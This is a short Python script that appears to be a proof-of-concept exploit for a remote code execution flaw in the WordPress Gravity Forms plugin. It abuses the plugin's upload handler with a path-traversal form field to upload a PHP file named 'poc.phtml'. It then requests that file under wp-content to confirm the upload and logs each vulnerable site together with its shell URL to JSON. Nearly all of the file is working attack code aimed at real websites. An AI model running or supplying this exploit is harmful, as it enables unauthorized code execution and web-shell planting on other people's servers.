import sys
import os
from pathlib import Path
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")




post = {'field_id': '3',
        'form_id': '1',
        'gfrom_unique_id': '../../../../',
        'name': 'poc.phtml'}
shell = {'file': os.path.join(Path(__file__).parent.parent, 'poc.phtml')}



def exploit(url):
    req = request(url)
    try:
        if not (url.startswith('https://') or url.startswith('http://')):
            url = 'http://' + url
        
        found = []
        _Post = req.post(url + "gf_page=upload", data=post, files=shell)
        _response = req.get(f"{url}/wp-content/_input_3_poc.phtml", headers={'USer-agent': 'ENG'}, timeout=9 )
        if "POC By ENG Yazeed" in _response.text:
            print(colors.yellow + "[+] ==> Gravity %s Vulnerable"  %url)
            found.append({
                "url": url,
                "type": "Gravity RCE",
                "status": "Vulnerable",
                "shell": _response.url,
            })
            json_me(url, "Gravity RCE", found)
        else:
            print(colors.red + "[-] Gravity [-]  %s Not Vulnerable"  %url)

    except Exception as e:
        print("[-] %s Gravity exploit Not Working" % e)


